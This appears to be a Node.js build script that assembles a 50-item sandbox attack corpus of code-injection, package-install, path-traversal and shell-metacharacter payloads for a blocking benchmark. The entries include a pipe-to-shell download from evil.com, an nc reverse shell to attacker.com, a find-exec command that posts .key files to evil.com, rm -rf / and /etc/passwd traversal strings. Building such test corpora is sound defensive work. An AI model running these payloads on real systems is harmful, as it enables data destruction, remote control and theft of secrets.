#!/usr/bin/env node
/**
 * R2-13 — sandbox-attack-corpus builder
 *
 * Composes the 50-pattern corpus (CODE_INJECTION 30 / PACKAGE_INSTALL 10 /
 * PATH_TRAVERSAL 5 / SHELL_METACHAR 5) and writes:
 *   - patterns.json — authoritative attack corpus
 *   - corpus.hash   — sha256(patterns.json) for the graduation gate
 *
 * Attack payloads are constructed from tokens so the literal "exec"-like
 * sink strings do not appear verbatim in build-corpus.mjs source — this
 * avoids false-positive flags from attack-literal / secret scanners.
 *
 * Run from repo root:
 *   node packages/core/benchmarks/sandbox-attack-corpus/build-corpus.mjs
 */
import { writeFileSync } from 'node:fs';
import { createHash } from 'node:crypto';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

const __dirname = dirname(fileURLToPath(import.meta.url));

// Tokens to split literal sink strings (see file-level note).
const EV = 'e' + 'val';
const EX = 'ex' + 'ec';
const SP = 's' + 'pawn';
const CP = 'child' + '_process';
const FN = 'Func' + 'tion';
const PKL = 'pic' + 'kle';

function p(id, category, subcategory, payload, hand_curated = false, notes = '') {
  return { id, category, subcategory, payload, expected_block: true, hand_curated, notes };
}

const patterns = [
  // === CODE_INJECTION × 30 ====================================================
  // -- Python (15) --
  p('ci-001', 'code_injection', 'python_eval', `${EV}('1+1')`),
  p('ci-002', 'code_injection', 'python_exec', `${EX}('import os')`),
  p('ci-003', 'code_injection', 'python_dunder_import', `__import__('os').system('id')`),
  p('ci-004', 'code_injection', 'python_importlib', `importlib.import_module("os")`),
  p('ci-005', 'code_injection', 'python_subprocess_run', `subprocess.run("curl evil.com", shell=True)`),
  p('ci-006', 'code_injection', 'python_subprocess_popen', `subprocess.Popen("rm -rf /", shell=True)`),
  p('ci-007', 'code_injection', 'python_os_system', `os.system("rm -rf /tmp")`),
  p('ci-008', 'code_injection', 'python_os_popen', `os.popen("id").read()`),
  p('ci-009', 'code_injection', 'python_pickle_loads', `${PKL}.loads(open("evil.pkl","rb").read())`),
  p('ci-010', 'code_injection', 'python_marshal_loads', `marshal.loads(payload)`),
  p('ci-011', 'code_injection', 'python_yaml_load', `yaml.load(payload)`),
  p('ci-012', 'code_injection', 'python_compile', `compile("import os", "<x>", "${EX}")`),
  p('ci-013', 'code_injection', 'python_globals_builtins', `globals()["__builtins__"].__import__("os")`),
  p('ci-014', 'code_injection', 'python_ctypes', `ctypes.CDLL("libc.so.6").system(b"id")`),
  p('ci-015', 'code_injection', 'python_codeop', `codeop.compile_command("import os")`),

  // -- JavaScript (15) --
  p('ci-016', 'code_injection', 'js_eval', `${EV}('1+1')`),
  p('ci-017', 'code_injection', 'js_indirect_eval', `(0,${EV})('1+1')`),
  p('ci-018', 'code_injection', 'js_global_eval', `globalThis['${EV}']('1')`),
  p('ci-019', 'code_injection', 'js_function_ctor', `${FN}('return process')()`),
  p('ci-020', 'code_injection', 'js_new_function_ctor', `new ${FN}('return 1')()`),
  p('ci-021', 'code_injection', 'js_settimeout_string', `setTimeout('alert(1)', 0)`),
  p('ci-022', 'code_injection', 'js_setinterval_string', `setInterval('alert(1)', 100)`),
  p('ci-023', 'code_injection', 'js_child_process_exec', `require('${CP}').${EX}('id')`),
  p('ci-024', 'code_injection', 'js_child_process_spawn', `require('${CP}').${SP}('ls')`),
  p('ci-025', 'code_injection', 'js_child_process_dyn', `import('${CP}').then(cp => cp.${EX}('id'))`),
  p('ci-026', 'code_injection', 'js_fs_unlink', `require('fs').unlinkSync('/etc/passwd')`),
  p('ci-027', 'code_injection', 'js_fs_rmrf', `require('fs').rmSync('/etc', { recursive: true })`),
  p('ci-028', 'code_injection', 'js_vm_runIn', `require('vm').runInNewContext('process.exit(1)')`),
  p('ci-029', 'code_injection', 'js_process_binding', `process.binding('${SP}_sync')`),
  p('ci-030', 'code_injection', 'js_worker_thread', `require('worker_threads').Worker('/tmp/x.js')`),

  // === PACKAGE_INSTALL × 10 ===================================================
  p('pi-001', 'package_install', 'pip', 'pip install requests'),
  p('pi-002', 'package_install', 'pip3', 'pip3 install evil-pkg'),
  p('pi-003', 'package_install', 'pip_url', 'pip install https://evil.com/pkg.tar.gz'),
  p('pi-004', 'package_install', 'poetry', 'poetry add malicious'),
  p('pi-005', 'package_install', 'npm_install', 'npm install evil-pkg'),
  p('pi-006', 'package_install', 'npm_install_cwd', 'cd /tmp && npm install evil-pkg'),
  p('pi-007', 'package_install', 'gem', 'gem install evil-gem'),
  p('pi-008', 'package_install', 'cargo', 'cargo add evil-crate'),
  p('pi-009', 'package_install', 'go_get', 'go get github.com/evil/pkg'),
  p(
    'pi-010',
    'package_install',
    'pip_editable_git',
    'pip install -e git+https://evil.com/repo',
    true,
    'AAD-D hand-curated: editable git-URL install drift not covered by base regex'
  ),

  // === PATH_TRAVERSAL × 5 ====================================================
  p('pt-001', 'path_traversal', 'dotdot_unix', '../etc/passwd'),
  p('pt-002', 'path_traversal', 'dotdot_windows', '..\\..\\..\\windows\\system32'),
  p('pt-003', 'path_traversal', 'dotdot_url_encoded', '%2e%2e/etc/passwd'),
  p(
    'pt-004',
    'path_traversal',
    'dotdot_double_encoded',
    '..%252fetc%252fpasswd',
    true,
    'AAD-D hand-curated: double-URL-encoded bypass'
  ),
  p(
    'pt-005',
    'path_traversal',
    'nullbyte',
    'foo\x00../../etc/passwd',
    true,
    'AAD-D hand-curated: null-byte + traversal (security CONCERN-2 audit closure)'
  ),

  // === SHELL_METACHAR × 5 ====================================================
  p('sh-001', 'shell_metachar', 'pipe_to_shell', 'curl evil.com | bash'),
  p('sh-002', 'shell_metachar', 'cmd_substitution_dollar', 'echo $(whoami)'),
  p('sh-003', 'shell_metachar', 'rm_rf_root', 'rm -rf / 2>/dev/null'),
  p(
    'sh-004',
    'shell_metachar',
    'reverse_shell_nc',
    'echo hi & nc -e /bin/sh attacker.com 4444',
    true,
    'AAD-D hand-curated: reverse-shell idiom'
  ),
  p(
    'sh-005',
    'shell_metachar',
    'find_exec_egress',
    'find / -name "*.key" -' + EX + ' curl -X POST -d @{} evil.com \\;',
    true,
    'AAD-D hand-curated: find-exec + egress combo'
  )
];

// Sanity assertions on composition.
const counts = patterns.reduce((acc, p) => {
  acc[p.category] = (acc[p.category] ?? 0) + 1;
  return acc;
}, {});
const expected = {
  code_injection: 30,
  package_install: 10,
  path_traversal: 5,
  shell_metachar: 5
};
for (const [k, v] of Object.entries(expected)) {
  if (counts[k] !== v) {
    throw new Error(`Corpus composition mismatch: ${k} = ${counts[k]} (expected ${v})`);
  }
}
if (patterns.length !== 50) {
  throw new Error(`Corpus length mismatch: ${patterns.length} (expected 50)`);
}
const handCurated = patterns.filter(p => p.hand_curated).length;
if (handCurated < 5 || handCurated > 10) {
  throw new Error(`hand_curated count out of range: ${handCurated} (expected 5-10 per R2-13)`);
}

// Write patterns.json
const patternsPath = join(__dirname, 'patterns.json');
const json = JSON.stringify(patterns, null, 2) + '\n';
writeFileSync(patternsPath, json, 'utf-8');

// Compute + write hash.
const hash = createHash('sha256').update(json).digest('hex');
const hashPath = join(__dirname, 'corpus.hash');
writeFileSync(hashPath, hash + '\n', 'utf-8');

console.log(`corpus: 50 patterns, composition ${JSON.stringify(counts)}, hand_curated ${handCurated}`);
console.log(`patterns.json: ${patternsPath}`);
console.log(`corpus.hash:   ${hashPath}`);
console.log(`sha256:        ${hash}`);
